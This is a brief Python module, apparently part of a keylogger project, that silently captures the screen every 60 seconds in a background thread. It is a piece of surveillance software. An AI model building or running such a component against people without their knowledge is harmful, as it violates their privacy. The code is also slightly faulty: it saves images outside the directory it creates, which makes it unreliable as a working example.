# screenshot.py
import pyautogui
import time
import threading
import os

def capture_screenshot():
    save_path = "D:\Keylogger-project\screenshot"  # Change this to your desired directory
    os.makedirs(save_path, exist_ok=True)  # Create directory if it doesn't exist
    while True:
        screenshot = pyautogui.screenshot()
        screenshot.save(f"screenshot_{int(time.time())}.png")
        time.sleep(60)  # Capture every 60 seconds

def start_screenshot_thread():
    screenshot_thread = threading.Thread(target=capture_screenshot)
    screenshot_thread.start()
